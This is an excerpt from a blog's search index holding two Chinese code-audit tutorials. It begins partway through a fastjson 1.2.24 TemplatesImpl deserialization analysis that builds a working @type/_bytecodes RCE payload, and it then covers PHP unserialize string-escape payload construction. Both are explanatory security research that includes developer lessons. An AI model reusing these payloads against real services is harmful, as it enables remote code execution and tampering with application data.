title="5、找newTransformer()的正确调用路径，过滤结果"></a>5、找newTransformer()的正确调用路径，过滤结果</h5><p>newTransformer()是接口类型的实现，但是IDEA把其他的同名接口的“实现被调用”也当作“用法查找”的结果了。需要逐个跟进验证，确认这6个路径是否触发newTransformer()。</p><p>newTransformer()接口定义在javax/xml/transform/Templates.java，部分代码如下：</p><pre><code>public interface Templates &#123;Transformer newTransformer() throws TransformerConfigurationException;</code></pre><p>接下来的过滤方法，就是依次看IDEA返回的结果，看那处的Templates的实现和newTransformer()的实现是不是调用getTransletInstance()，作为过滤的标准。</p><p>比如，对第一个结果进行分析，如图：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-15-26.png" alt="2024-04-14-13-15-26"></p><p>看到stylesheet（即interface Templates）是tfactory.newTemplates(source)来实现，跟进newTemplates(source)部分，发现仅返回一个抽象类型的接口类型（Templates上文已提到是一个接口），如下：</p><pre><code>public abstract Templates newTemplates(Source source)throws TransformerConfigurationException;</code></pre><p>那继续跟进tfactory类型，看其对newTemplates接口的实现部分的代码。跟进后未发现其重写newTemplates()，说明该条作为“触发newTransformer()”的“查找用法”的结果，不是我们期望的。</p><p>使用根据上下文接口实现的方法，可以依次排除另外4个于我们而言的非期望结果（均未执行到我们期望的Transformer()接口的代码），最终我们跟进getOutputProperties()，如图：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-15-53.png" alt="2024-04-14-13-15-53"></p><p>经过简单的步入调试，确认getOutputProperties()会执行到期望的Transformer()接口实现。结合fastjson的反序列化特性，getOutputProperties()将会成为POC入口。</p><h3 id="4-2-fastjson为什么需要使用-type键触发"><a href="#4-2-fastjson为什么需要使用-type键触发" class="headerlink" title="4.2 fastjson为什么需要使用@type键触发"></a>4.2 fastjson为什么需要使用@type键触发</h3><p>把fastjson代码clone下来，版本回退后，新建了Baduser类和Main类，用作调用fastjson的程序入口。</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-16-31.png" alt="2024-04-14-13-16-31"></p><p>步入代码跟进，com/alibaba/fastjson/parser/DefaultJSONParser.java的325行，代码如下：</p><pre><code>if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; String typeName = lexer.scanSymbol(symbolTable, &#39;&quot;&#39;);    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</code></pre><p>这里可以看到JSON.DEFAULT_TYPE_KEY，其在com/alibaba/fastjson/JSON.java进行了定义：</p><pre><code>public abstract class JSON implements JSONStreamAware, JSONAware &#123;    …public static String           DEFAULT_TYPE_KEY     = &quot;@type&quot;;</code></pre><p>再看上一段代码中满足key==”@type”的if逻辑，会触发如下代码：</p><pre><code>Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</code></pre><p>此处的loadClass类似上文提到的类加载器，此处fastjson亦有不同程度的继承和改写。使用@type键，可以自行指定类名。</p><h3 id="4-3-分析：如何构造payload"><a href="#4-3-分析：如何构造payload" class="headerlink" title="4.3 分析：如何构造payload"></a>4.3 分析：如何构造payload</h3><p>根据上文提及条件，漏洞构造初步条件如下：</p><pre><code>1.fastjson通过@type指定反序列类名，通过JSON.parse和JSON.parseObject两个路径可以触发无参构造函数、私有变量的set、get方法；2.对于TemplatesImpl类，分析获取的调用链顶点是getOutputProperties()，TemplatesImpl类有私有变量private Properties _outputProperties;3.第1和第2已满足payload运行入口，需要传入_outputProperties用以触发getOutputProperties()；4.根据对TemplatesImpl#getTransletInstance()的分析，构造的字节码的类必须是AbstractTranslet的子类，且需要满足_name不为null，且_class为null；</code></pre><p>遂令_name为非null（空字符串或什么字符串均可），令outputProperties为{}（{}表示JSON的空对象，而非null，反序列化的实例对象的该成员变量为“空对象”而非null；若不写某些私有变量，则该值将为null），令_bytecodes为byte[][]类型。</p><p>由于涉及私有变量的反序列化，在进行反序列化时，需要携带支持私有变量的参数Feature.SupportNonPublicField，如：</p><pre><code>JSON.parseObject(payload, Feature.SupportNonPublicField);</code></pre><p>初步构造payload如下：</p><pre><code>public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;    String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;&lt;EvilClass.class的base64编码&gt;\&quot;], \&quot;_name\&quot;:\&quot;\&quot;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;    JSON.parseObject(payload, Feature.SupportNonPublicField);&#125;</code></pre><p>运行完毕后，没有弹出计算器，只有报错，如图所示：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-19-03.png" alt="2024-04-14-13-19-03"></p><p>看到报错是set property error, outputProperties，目测是outputProperties属性赋值过程出现错误，跟进调试发现问题，如图所示：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-19-33.png" alt="2024-04-14-13-19-33"></p><p>由于没有给_tfactory赋值，此时_tfactory是null，代码_tfactory.getExternalExtensionsMap()报错。</p><p>跟进_tfactory，如下：</p><pre><code>private transient TransformerFactoryImpl _tfactory = null;</code></pre><p>transient修饰符是说该成员值不受序列化和反序列化的影响，为默认值。但是transient修饰符仅对java自身的序列化反序列化机制有效，对fastjson的机制无效。此处transient表示了_tfactory仅需代码定义的默认值即可，修改此值对程序运行没有直接影响。</p><p>跟进TransformerFactoryImpl类型，确认成员方法中存在getExternalExtensionsMap()。</p><p>因此，我们在payload中对_tfactory变量传入{}即可使payload的执行正常。</p><p>payload修改如下：</p><pre><code>public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;    String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;&lt;EvilClass.class的base64编码&gt;\&quot;], \&quot;_name\&quot;:\&quot;\&quot;, \&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;    JSON.parseObject(payload, Feature.SupportNonPublicField);&#125;</code></pre><p>运行，成功执行POC。</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-20-35.png" alt="2024-04-14-13-20-35"></p><h3 id="4-4-漏洞风险"><a href="#4-4-漏洞风险" class="headerlink" title="4.4 漏洞风险"></a>4.4 漏洞风险</h3><p>改漏洞在fastjson版本在[1.2.22, 1.2.24]中存在，如果代码中设置对SupportNonPublicField反序列化私有变量的支持，且存在fastjson.JSON.parse()或fastjson.JSON.parseObject()直接接受外部json数据的情景，该接口存在风险。</p><h1 id="5-对开发安全的启示"><a href="#5-对开发安全的启示" class="headerlink" title="5 对开发安全的启示"></a>5 对开发安全的启示</h1><p>本次漏洞的根本原因是由于TemplatesImpl类中重写了classLoader类，但没有写访问修饰符限制，导致重写后的defineClass方法默认是default属性，可以被同包其他类、方法访问，产生了调用链。</p><p><em>对开发安全的启示：</em></p><pre><code>1.重写classLoader类常见于反序列化功能的实现，反序列化伴随着安全隐患，需要慎重对待。建议使用严格的访问修饰符限制重写，减小被非预期调用的暴露面；2.fastjson的1版本官方已不再进行支持，建议使用fastjson2组件；</code></pre>]]></content>
      
      
      <categories>
          
          <category> code-audit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Unserialization Escaping</title>
      <link href="/2022/07/09/code_audit/unserializationEscaping/"/>
      <url>/2022/07/09/code_audit/unserializationEscaping/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#反序列化字符串逃逸">反序列化字符串逃逸</a><ul><li><a href="#少变多">少变多</a><pre><code>- [实验](#实验)</code></pre><ul><li><a href="#做法">做法</a><ul><li><a href="#1-生成一个看起来正常的序列化字符串">1 生成一个看起来正常的序列化字符串</a></li><li><a href="#2-构造最终的pass值">2 构造最终的pass值</a></li><li><a href="#3-计算溢出位移构造payload">3 计算溢出位移，构造payload</a></li></ul></li></ul></li><li><a href="#多变少">多变少</a><pre><code>- [实验代码](#实验代码)</code></pre><ul><li><a href="#做法-1">做法</a><ul><li><a href="#1-生成一个看起来正常的序列化字符串-1">1 生成一个看起来正常的序列化字符串</a></li><li><a href="#2-计算被吃掉部分字符串">2 计算被吃掉部分字符串</a></li><li><a href="#3-构造payload拼接尾部">3 构造payload拼接尾部</a></li></ul></li></ul></li></ul></li></ul><h1 id="反序列化字符串逃逸"><a href="#反序列化字符串逃逸" class="headerlink" title="反序列化字符串逃逸"></a>反序列化字符串逃逸</h1><h2 id="少变多"><a href="#少变多" class="headerlink" title="少变多"></a>少变多</h2><h5 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h5><pre><code>&lt;?php// 少变多题目function filter($str)&#123;    return str_replace(&#39;bb&#39;, &#39;ccc&#39;, $str);&#125;class A&#123;    public $name=&#39;aaaa&#39;;    public $pass=&#39;123456&#39;;&#125;</code></pre><p>构造顺序，从</p><pre><code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</code></pre><p>开始计算</p><pre><code>// 得知 少变多 bb-&gt;ccc ，被篡改的s长度要大，s内容要小，才能顶出// 数出`&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;`部分是27长度字符，则需要顶出27// 顶出长度/变长位数 就是 被替换字符 的个数// 故输出27对&quot;bb&quot;</code></pre><p>// “;s:4:”pass”;s:6:”hacker”;}     len:27</p><p>// 2-&gt;3 差值1   27对</p><pre><code>$payload = &#39;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;&#39;;echo $payload;echo &quot;\n&quot;;$payload=filter($payload);echo $payload;echo &quot;\n&quot;;$o=unserialize($payload);// echo $o-&gt;pass;echo serialize($o);?&gt;</code></pre><h3 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h3><h5 id="1-生成一个看起来正常的序列化字符串"><a href="#1-生成一个看起来正常的序列化字符串" class="headerlink" title="1 生成一个看起来正常的序列化字符串"></a>1 生成一个看起来正常的序列化字符串</h5><pre><code>&lt;?php// expclass A&#123;    public $name=&#39;12&#39;;    public $pass=&#39;21&#39;;&#125;$o = new A();echo serialize($o);?&gt;</code></pre><p>得到</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;12&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;</code></pre><h5 id="2-构造最终的pass值"><a href="#2-构造最终的pass值" class="headerlink" title="2 构造最终的pass值"></a>2 构造最终的pass值</h5><p>因为我们构造的这部分代码会被“少变多”顶出去，因此我们从被构造变量的上一个变量的变量值的右引号起开始构造，构造如下这部分</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;12&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;</code></pre><p>构造为</p><pre><code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code></pre><h5 id="3-计算溢出位移，构造payload"><a href="#3-计算溢出位移，构造payload" class="headerlink" title="3 计算溢出位移，构造payload"></a>3 计算溢出位移，构造payload</h5><p>从上一步已构造得到</p><pre><code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code></pre><p>使用python计算长度 len(‘“;s:4:”pass”;s:6:”hacker”;}’)，得其长度为27</p><p>已知题目是’bb’ 变为 ‘ccc’，即 2-&gt;3，一对的长度差值多1个字节。为了顶出 27长度 的payload，我们则 27/1 == 27 ，即构造27对 ‘bb’ 变 ‘ccc’</p><p>从第一步得到的字符串，直接删除name的变量值中原有字符串（即原有的“12”这种占位字符），填写27对’bb’（即54个b）和我们构造后的payload</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;</code></pre><p>如上payload，黄底红字是我们拼上去的，灰底紫字在未来将会被顶出去，实际作废。</p><p>最后不要忘了修改name变量值的长度，题目会将这27对bb替换为27对ccc，即变为81个长度的字符值。</p><p>因此，我们需要修改字符串长度为 81</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;</code></pre><p>传输此字符串，则成功结束。<br>发送payload，反序列化后的pass将会是 </p><pre><code>s:6:&quot;hacker&quot;</code></pre><p>比对如下：</p><p><img src="/2022/07/09/code_audit/unserializationEscaping/2024-04-14-11-57-35.png" alt="2024-04-14-11-57-35"></p><h2 id="多变少"><a href="#多变少" class="headerlink" title="多变少"></a>多变少</h2><h5 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h5><pre><code>&lt;?php// 多变少题目function str_rep($string)&#123;    return preg_replace( &#39;/php|test/&#39;,&#39;&#39;, $string);&#125;class A&#123;    public $name=&#39;aaaa&#39;;    public $pass=&#39;123456&#39;;&#125;</code></pre><hr><pre><code>// 先构造尾部字符串// &quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;&#125;  payload部分：这是最终要反序列化识别出来的// &quot;;s:4:&quot;pass&quot;;s:2:&quot;222    作废部分：这部分是需要被吃的，不过这部分可以计算，比如长度是21，或者不是整倍数也可以直接改字符串使其长度是变化长度的整倍数// 变化：3-&gt;0或4-&gt;0，即找3或者4的倍数，然后构造 21 / 3 = 7,则写7个php</code></pre><hr><pre><code>$payload = &#39;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:3:&quot;221&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;&#39;;echo &quot;\n&quot;;$payload=str_rep($payload);echo $payload;echo &quot;\n&quot;;$o=unserialize($payload);echo $o-&gt;pass;?&gt;</code></pre><h3 id="做法-1"><a href="#做法-1" class="headerlink" title="做法"></a>做法</h3><h5 id="1-生成一个看起来正常的序列化字符串-1"><a href="#1-生成一个看起来正常的序列化字符串-1" class="headerlink" title="1 生成一个看起来正常的序列化字符串"></a>1 生成一个看起来正常的序列化字符串</h5><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;12&quot;;s:4:&quot;pass&quot;;s:2:&quot;21&quot;;&#125;</code></pre><h5 id="2-计算被吃掉部分字符串"><a href="#2-计算被吃掉部分字符串" class="headerlink" title="2 计算被吃掉部分字符串"></a>2 计算被吃掉部分字符串</h5><p>如这部分</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:2:&quot;12&quot;;s:4:&quot;pass&quot;;s:3:&quot;212&quot;;&#125;</code></pre><p><code>&quot;;s:4:&quot;pass&quot;;s:3:&quot;212</code><br>是将被吃掉的部分，计算长度是21</p><p>变化：3-&gt;0或4-&gt;0，即找3或者4的倍数。此处假设我们选择构造3的倍数，则构造 21 / 3 = 7,则写7个php。</p><p>注意，此处如果长度是22，但是遇到的题目是3-&gt;0位移为3，22不是3的整倍数，也不用太担心。“多变少”题型我们可以随意控制被吃的字符串长度（反正会被吃掉，甚至不用计算这个s的长度对不对），比如是”;s:4:”pass”;s:4:”2221被吃的22长度，那可以改字符串长度和字符串是21长度的”;s:4:”pass”;s:2:”222</p><p>那么payload现在就是”;s:4:”pass”;s:3:”212将会被phpphpphpphpphpphpphp吃掉。</p><p>payload如下</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:3:&quot;221</code></pre><h5 id="3-构造payload拼接尾部"><a href="#3-构造payload拼接尾部" class="headerlink" title="3 构造payload拼接尾部"></a>3 构造payload拼接尾部</h5><p>根据上面提到的残缺，直接构造payload，拼接尾部构成完整的payload即可。</p><pre><code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;</code></pre><p>变为</p><pre><code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:3:&quot;221&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> code-audit </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
